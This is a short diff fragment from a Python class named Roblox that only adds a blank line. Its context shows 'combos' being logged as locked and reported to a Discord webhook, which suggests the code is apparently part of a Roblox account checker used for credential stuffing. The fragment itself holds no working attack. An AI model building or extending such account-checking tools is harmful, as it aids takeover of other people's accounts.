@@ -374,6 +374,7 @@ class Roblox:
                     self.locked.append(combo)
 
                     if WEBHOOK_ENABLED:
+                        
                         try:
                             webhook = DiscordWebhook(url=LOCKED_WEBHOOK if LOCKED_WEBHOOK else WEBHOOK)
 
